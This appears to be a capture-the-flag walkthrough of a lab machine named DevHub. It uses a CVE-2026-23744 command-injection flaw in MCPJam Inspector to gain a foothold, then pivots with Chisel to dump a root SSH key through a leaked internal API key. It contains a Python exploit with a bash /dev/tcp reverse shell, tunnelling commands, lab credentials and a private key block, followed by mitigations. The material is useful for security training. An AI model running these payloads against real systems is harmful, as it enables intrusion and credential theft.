---
title: DevHub
machineName: DevHub
os: linux
difficulty: medium
season: Season 11
tags:
  - Model Context Protocol
  - MCP
  - MCPJam
  - CVE-2026-23744
  - RCE
  - Chisel
  - Jupyter Notebook
  - SSH Key Extraction
  - API Exploitation
date: '2026-05-30'
pointsAwarded: 30
machineIP: ''
summary: 'A fast-paced Medium Linux machine featuring Model Context Protocol (MCP) tooling. Initial foothold is obtained via an unauthenticated command execution flaw in MCPJam Inspector v1.4.2 (CVE-2026-23744). Privilege escalation involves pivoting through internal services with Chisel, analyzing an internal OPSMCP diagnostic API on port 5000, and invoking an administrative tool function with leaked API keys to exfiltrate the root SSH key.'
---

# 🛡️ HTB - DevHub (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** DevHub
- **Operating System:** Linux
- **Difficulty:** Medium
- **Date of Scan:** 2026-05-30
- **Vulnerabilities:** Unauthenticated MCPJam Inspector RCE via `/api/mcp/connect` (CVE-2026-23744), Hardcoded API Secrets in OPSMCP Internal Service, Root SSH Private Key Disclosure via Administrative Tool Endpoint

---

## Step 1 - Reconnaissance

### Nmap Port Scanning & Service Discovery

Let us start our enumeration with a fast Nmap scan against the target:

```bash
nmap -F 10.129.54.253
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-11 06:08 UTC
Nmap scan report for devhub.htb (10.129.54.253)
Host is up (2.9s latency).
Not shown: 98 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 36.23 seconds
```

- 🔍 *A Linux box with SSH on port 22 and HTTP on port 80.*
- 🔍 *We add `devhub.htb` to our `/etc/hosts` file and browse to `http://devhub.htb/`.*
- 🔍 *Inspecting the landing page reveals a static HTML portal for internal developers outlining three internal services:*
  1. **MCP Inspector** - running at port 6274
  2. **Analytics Dashboard** - internal only, running at port 8888
  3. **Code Repository** - internal git server

---

## Step 2 - Initial Foothold

### MCPJam Inspector RCE via /api/mcp/connect (CVE-2026-23744)

- 🔍 *Navigating to the MCP Inspector service exposed on port 6274 (`http://devhub.htb:6274`) and checking the settings endpoint reveals **MCPJam Version: v1.4.2**.*
- 🔍 *Researching this version confirms a critical Remote Code Execution vulnerability: **CVE-2026-23744**.*

> ⚠️ **Vulnerability Detail (CVE-2026-23744):** The `/api/mcp/connect` endpoint, intended for connecting to MCP servers, is accessible without authentication. When an HTTP request reaches the `/connect` route, the application extracts the `command` and `args` fields and executes them directly via system commands without input validation.

- 🔍 *Because the MCP endpoint is bound to `0.0.0.0` (all interfaces) rather than localhost, we can send our reverse shell payload inside the `command` and `args` parameters.*
- 🔍 *We craft a Python exploit script to dispatch the payload:*

```python
import requests

target = "http://devhub.htb:6274"
url = f'{target}/api/mcp/connect'

# Replace with your tun0 / HTB VPN IP and your active netcat listener port
ip = "10.10.15.54"
port = "5555"

data = {
    "serverConfig": {
        "command": "/bin/bash",
        "args": [
            "-c",
            f"/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        ],
        "env": {}
    },
    "serverId": "stable_mcp_session"
}

print(f"[*] Dispatching persistent shell payload to {url}...")
try:
    response = requests.post(url, json=data, timeout=5)
    print(f"[+] Server response: {response.status_code}")
except requests.exceptions.Timeout:
    print("[+] Request timed out - reverse shell likely established!")
```

- 🔍 *Setting up a Netcat listener on port 5555 and triggering the script yields an immediate shell:*

```bash
nc -lvnp 5555
```

```text
listening on [any] 5555 ...
connect to [10.10.15.54] from (UNKNOWN) [10.129.54.253] 48274
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ id
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
```

---

## Step 3 - Privilege Escalation to Root

### Internal Reconnaissance & Chisel Port Forwarding (5000 & 8888)

- 🔍 *As `mcp-dev`, we inspect listening network sockets on the host:*

```bash
ss -tunlp
```

```text
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process  
udp   UNCONN 0      0      127.0.0.53%lo:53        0.0.0.0:*                                              
udp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:*                                              
tcp   LISTEN 0      511          0.0.0.0:6274      0.0.0.0:*    users:(("node-MainThread",pid=1294,fd=29))
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*                                              
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*                                              
tcp   LISTEN 0      128        127.0.0.1:5000      0.0.0.0:*    # OPSMCP Tool Service
tcp   LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*                                              
tcp   LISTEN 0      128        127.0.0.1:8888      0.0.0.0:*    # Internal Analytics Dashboard (Jupyter)
tcp   LISTEN 0      128             [::]:22           [::]:*  
```

- 🔍 *Two internal services are listening on loopback: port 5000 and port 8888.*
- 🔍 *We establish a reverse tunnel with Chisel to access both ports from our attack machine:*

```bash
# On attacker machine:
./chisel server -p 8000 --reverse
```

```bash
# On target machine:
./chisel client 10.10.15.54:8000 R:5000:127.0.0.1:5000 R:8888:127.0.0.1:8888
```

- 🔍 *Connecting to `http://127.0.0.1:8888` reveals a Jupyter Notebook instance. Exploring the filesystem, we discover the source code for the internal service running on port 5000 (`/opt/opsmcp/app.py`):*

```python
from flask import Flask, request, jsonify
import os

app = Flask(__name__)
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "healthy"})

@app.route('/tools/call', methods=['POST'])
def call_tool():
    api_key = request.headers.get('X-API-Key')
    if api_key != VALID_API_KEY:
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.get_json() or {}
    tool_name = data.get('name')
    args = data.get('arguments', {})

    if tool_name == "ops._admin_dump":
        target = args.get('target')
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    return jsonify({
                        "target": "ssh_keys",
                        "root_private_key": f.read(),
                        "note": "Emergency recovery key dump"
                    })
            except Exception as e:
                return jsonify({"error": str(e)}), 500
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
    return jsonify({"error": "Invalid tool"}), 400

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

### Leaked OPSMCP API Key & Administrative Tool Invocation

- 🔍 *The script exposes a hardcoded master API key: `opsmcp_secret_key_4f5a6b7c8d9e0f1a`.*
- 🔍 *It also provides a diagnostic backdoor tool `ops._admin_dump` that directly reads the root SSH private key at `/root/.ssh/id_rsa`.*
- 🔍 *We verify the endpoint over our Chisel tunnel:*

```bash
curl -s http://127.0.0.1:5000/
```

```json
{
  "auth": "Required - X-API-Key header",
  "endpoints": ["/tools/list", "/tools/call", "/health"],
  "server": "OPSMCP",
  "status": "operational",
  "version": "2.1.0"
}
```

- 🔍 *Now we dispatch an authenticated POST request requesting the `ssh_keys` target:*

```bash
curl -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
```

```json
{
  "note": "Emergency recovery key dump",
  "root_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\n...\n-----END OPENSSH PRIVATE KEY-----\n",
  "target": "ssh_keys"
}
```

### SSH Root Access & Flag Capture

- 🔍 *We extract and format the OpenSSH private key on our attack machine:*

```bash
cat << 'EOF' > root.key
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9
G/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX
8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z
6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n
Ghm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ
7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W
v9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu
ITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs
gyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s
qKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa
V3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS
0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6
JtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8
HUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB
dcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L
Cvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2
nkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn
Mz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK
MtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI
oocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk
Jt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ
nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr
C8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK
lFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
-----END OPENSSH PRIVATE KEY-----
EOF
chmod 600 root.key
```

- 🔍 *Logging in as root via SSH:*

```bash
ssh -i root.key root@devhub.htb
```

```text
root@devhub:~# id
uid=0(root) gid=0(root) groups=0(root)

root@devhub:~# ls -la /root/root.txt
-rw-r----- 1 root root 33 Jul 11 06:06 /root/root.txt
```

- 🔍 *Machine fully rooted!*

---

## Mitigations & Security Perspective

### 🔴 MCPJam Inspector Unauthenticated RCE (CVE-2026-23744)
- **Root Cause:** The `/api/mcp/connect` API endpoint accepted raw `command` and `args` parameters without authentication or argument sanitization, executing them directly via `child_process`.
- **Remediation:** Upgrade `@mcpjam/inspector` to version 1.4.3 or later. Never expose development inspector endpoints to external interfaces (`0.0.0.0`).

### 🔴 Hardcoded Master API Keys in Internal Microservices
- **Root Cause:** The internal OPSMCP tool service contained static, hardcoded API secrets (`VALID_API_KEY`) in source files accessible by the local application user.
- **Remediation:** Implement short-lived cryptographic tokens or dynamic identity-based authentication (e.g., mTLS) rather than static shared secrets.

### 🔴 Unrestricted Administrative Tool Exposure
- **Root Cause:** Exposing an administrative tool endpoint (`ops._admin_dump`) that directly reads `/root/.ssh/id_rsa` violates defense-in-depth and the principle of least privilege.
- **Remediation:** Remove backdoor diagnostic endpoints from production environments and ensure SSH private keys are strictly permissioned and unreadable by auxiliary services.
